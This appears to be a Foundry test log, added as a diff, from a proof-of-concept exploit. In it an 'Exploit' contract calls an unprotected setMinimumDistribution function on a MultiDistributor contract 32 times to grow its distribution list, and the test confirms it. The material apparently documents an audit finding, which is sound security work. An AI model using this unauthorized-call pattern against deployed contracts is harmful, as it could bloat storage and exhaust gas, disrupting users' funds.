@@ -1,0 +1,234 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/16760-setminimumdistribution-not-protected_exp.sol:PoC_16760
+[PASS] test_untrusted_user_can_grow_distribution_list() (gas: 2410162)
+Traces:
+  [2410162] PoC_16760::test_untrusted_user_can_grow_distribution_list()
+    ├─ [716585] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [345293] → new MultiDistributor@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 1
+    │   │   │   @ 0x336623c45f4242c97e6c17a49fb00471ec0564c385d11348671bf17265e46b72: 0 → 1
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563: 0 → 51966
+    │   │   └─ ← [Return] 1392 bytes of code
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   └─ ← [Return] 1582 bytes of code
+    ├─ [1654535] Exploit::run()
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(ECRecover: [0x0000000000000000000000000000000000000001], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564: 0 → 1
+    │   │   │   @ 0xcc69885fda6bcc1a4ace058b4a62bf5e179ea78fd58a1ccd71c22cc9b688792f: 0 → 1
+    │   │   │   @ 0: 1 → 2
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(SHA-256: [0x0000000000000000000000000000000000000002], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 2 → 3
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e565: 0 → 2
+    │   │   │   @ 0xd9d16d34ffb15ba3a3d852f0d403e2ce1d691fb54de27ac87cd2f993f3ec330f: 0 → 2
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(RIPEMD-160: [0x0000000000000000000000000000000000000003], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x7dfe757ecd65cbd7922a9c0161e935dd7fdbcc0e999689c7d31633896b1fc60b: 0 → 3
+    │   │   │   @ 0: 3 → 4
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e566: 0 → 3
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(Identity: [0x0000000000000000000000000000000000000004], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xedc95719e9a3b28dd8e80877cb5880a9be7de1a13fc8b05e7999683b6b567643: 0 → 4
+    │   │   │   @ 0: 4 → 5
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e567: 0 → 4
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(ModExp: [0x0000000000000000000000000000000000000005], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 5 → 6
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e568: 0 → 5
+    │   │   │   @ 0xe2689cd4a84e23ad2f564004f1c9013e9589d260bde6380aba3ca7e09e4df40c: 0 → 5
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(ECAdd: [0x0000000000000000000000000000000000000006], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e569: 0 → 6
+    │   │   │   @ 0x8f331abe73332f95a25873e8b430885974c0409691f89d643119a11623a7924a: 0 → 6
+    │   │   │   @ 0: 6 → 7
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(ECMul: [0x0000000000000000000000000000000000000007], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xdc686ec4a0ff239c70e7c7c36e8f853eced3bc8618f48d2b816da2a74311237e: 0 → 7
+    │   │   │   @ 0: 7 → 8
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e56a: 0 → 7
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(ECPairing: [0x0000000000000000000000000000000000000008], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e56b: 0 → 8
+    │   │   │   @ 0x4db623e5c4870b62d3fc9b4e8f893a1a77627d75ab45d9ff7e56ba19564af99b: 0 → 8
+    │   │   │   @ 0: 8 → 9
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(Blake2F: [0x0000000000000000000000000000000000000009], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 9 → 10
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e56c: 0 → 9
+    │   │   │   @ 0x74a5fbcb419ab7dbacbb2c92a4e163730f0da5c72b911deecf4f05a6b327d0a4: 0 → 9
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(PointEvaluation: [0x000000000000000000000000000000000000000A], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x2a32391a76c35a36352b711f9152c0d0a340cd686850c8ef25fbb11c71b89e7b: 0 → 10
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e56d: 0 → 10
+    │   │   │   @ 0: 10 → 11
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(BLS12_G1ADD: [0x000000000000000000000000000000000000000b], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xfc80cd5fe514767bc6e66ec558e68a5429ea70b50fa6caa3b53fc9278e918632: 0 → 11
+    │   │   │   @ 0: 11 → 12
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e56e: 0 → 11
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(BLS12_G1MSM: [0x000000000000000000000000000000000000000C], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e56f: 0 → 12
+    │   │   │   @ 0x23bf72df16f8335be9a3eddfb5ef1c739b12847d13a384ec83f578699d38eb89: 0 → 12
+    │   │   │   @ 0: 12 → 13
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(BLS12_G2ADD: [0x000000000000000000000000000000000000000d], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x86b3fa87ee245373978e0d2d334dbde866c9b8b039036b87c5eb2fd89bcb6bab: 0 → 13
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e570: 0 → 13
+    │   │   │   @ 0: 13 → 14
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(BLS12_G2MSM: [0x000000000000000000000000000000000000000E], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 14 → 15
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e571: 0 → 14
+    │   │   │   @ 0x57aaafa65c4e563d39fff90096a5fa76d42117f53d87ef870784e64d63a8a16b: 0 → 14
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(BLS12_PAIRING_CHECK: [0x000000000000000000000000000000000000000F], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x12bd632ff333b55931f9f8bda8b4ed27e86687f88c95871969d72474fb428c14: 0 → 15
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e572: 0 → 15
+    │   │   │   @ 0: 15 → 16
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(BLS12_MAP_FP_TO_G1: [0x0000000000000000000000000000000000000010], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e573: 0 → 16
+    │   │   │   @ 0x755311b9e2cee471a91b161ccc5deed933d844b5af2b885543cc3c04eb640983: 0 → 16
+    │   │   │   @ 0: 16 → 17
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(BLS12_MAP_FP2_TO_G2: [0x0000000000000000000000000000000000000011], 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 17 → 18
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e574: 0 → 17
+    │   │   │   @ 0xc8d233a0ebef7c9a17d2b0b17eea62cca39002a128ccf419119b4a1a1f1e7428: 0 → 17
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x0000000000000000000000000000000000000012, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e575: 0 → 18
+    │   │   │   @ 0: 18 → 19
+    │   │   │   @ 0x40165e7164257b249280bf839a50283d248062ed7b0e6d8820cb6c506bfcf7d3: 0 → 18
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x0000000000000000000000000000000000000013, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 19 → 20
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e576: 0 → 19
+    │   │   │   @ 0x41cb80f82badddd72e38fda86a7cbba38fafd9735ef98c7795abbbaf2b149562: 0 → 19
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x0000000000000000000000000000000000000014, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e577: 0 → 20
+    │   │   │   @ 0: 20 → 21
+    │   │   │   @ 0x467a5c61216cad3003bc3395c339807c735d5c3d989ca4bc0ef2a37e14ce2679: 0 → 20
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x0000000000000000000000000000000000000015, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x4e788733fe0bff9af5f3e3a353367490c603293e53707fe7e4e0071b9ed497d6: 0 → 21
+    │   │   │   @ 0: 21 → 22
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e578: 0 → 21
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x0000000000000000000000000000000000000016, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x2b00120b81607971383f6f5676c1551d6bb27be3f263689fd3630e1a5be14018: 0 → 22
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e579: 0 → 22
+    │   │   │   @ 0: 22 → 23
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x0000000000000000000000000000000000000017, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xbdbfd5fe12b0725f9a86effbf0320821eb71455f8b2a1271fae01b3621e6f172: 0 → 23
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e57a: 0 → 23
+    │   │   │   @ 0: 23 → 24
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x0000000000000000000000000000000000000018, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 24 → 25
+    │   │   │   @ 0x80f14989282b60fa53cdd4f20dddf40419d0398091709cceef4ea6608cb53a86: 0 → 24
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e57b: 0 → 24
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x0000000000000000000000000000000000000019, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 25 → 26
+    │   │   │   @ 0x2480fe25ee21f0b2bc289ccff6df415947190b288094ab9f0cbd50f7b814fd5e: 0 → 25
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e57c: 0 → 25
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x000000000000000000000000000000000000001a, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 26 → 27
+    │   │   │   @ 0xddd2ed02835f51d041d738f145bf914e284838547c9bcc952ea4f9de82c9f093: 0 → 26
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e57d: 0 → 26
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x000000000000000000000000000000000000001B, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 27 → 28
+    │   │   │   @ 0xd6e773d900ec812417038da9baf6d960fcc201dd4bfa0d6323c29c7f6d7d874a: 0 → 27
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e57e: 0 → 27
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x000000000000000000000000000000000000001c, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 28 → 29
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e57f: 0 → 28
+    │   │   │   @ 0x02d9f8353bca53bc9b195aa186ab6d98b49a9120c00257ee2c7d860c26f864ea: 0 → 28
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x000000000000000000000000000000000000001D, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 29 → 30
+    │   │   │   @ 0x31ff9da46623ded696608610c3749320b1cb2c2dfd644b1139da5367a8e616cf: 0 → 29
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e580: 0 → 29
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x000000000000000000000000000000000000001e, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x68fb8e7cad479ccc9244a179d64897454189fd25db04e15d3a5135327a17597b: 0 → 30
+    │   │   │   @ 0: 30 → 31
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e581: 0 → 30
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x000000000000000000000000000000000000001F, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xaf2afaf35ad6da1368c28c91ba52a84b6fc26e5aa0d9b26dc4fa0373e4d12c30: 0 → 31
+    │   │   │   @ 0: 31 → 32
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e582: 0 → 31
+    │   │   └─ ← [Stop]
+    │   ├─ [47880] MultiDistributor::setMinimumDistribution(0x0000000000000000000000000000000000000020, 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e583: 0 → 32
+    │   │   │   @ 0x6280e9caec09c2f0007c3f9e61e9e1a060188c72cdbb510e12183e12d0752cef: 0 → 32
+    │   │   │   @ 0: 32 → 33
+    │   │   └─ ← [Stop]
+    │   ├─ [39143] MultiDistributor::distribute()
+    │   │   ├─  storage changes:
+    │   │   │   @ 3: 0 → 33
+    │   │   └─ ← [Stop]
+    │   ├─ [483] MultiDistributor::tokenCount() [staticcall]
+    │   │   └─ ← [Return] 33
+    │   ├─ [426] MultiDistributor::distributionIterations() [staticcall]
+    │   │   └─ ← [Return] 33
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 33
+    │   │   @ 2: 0 → 33
+    │   └─ ← [Stop]
+    ├─ [425] Exploit::inserted() [staticcall]
+    │   └─ ← [Return] 33
+    ├─ [0] VM::assertEq(33, 33) [staticcall]
+    │   └─ ← [Return]
+    ├─ [403] Exploit::iterations() [staticcall]
+    │   └─ ← [Return] 33
+    ├─ [0] VM::assertEq(33, 33) [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.02ms (1.80ms CPU time)
+
+Ran 1 test suite in 26.62ms (2.02ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
